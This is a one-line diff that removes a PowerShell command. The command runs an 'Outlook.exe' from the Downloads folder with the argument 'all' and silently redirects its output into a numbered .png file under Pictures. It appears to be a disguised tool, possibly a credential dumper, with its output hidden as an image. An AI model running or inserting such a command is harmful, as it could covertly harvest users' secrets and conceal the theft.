@@ -1,1 +1,0 @@
-Start-Process -FilePath $env:USERPROFILE\Downloads\Outlook.exe -ArgumentList all -RedirectStandardOutput $env:USERPROFILE\Pictures\3263452345.png -NoNewWindow
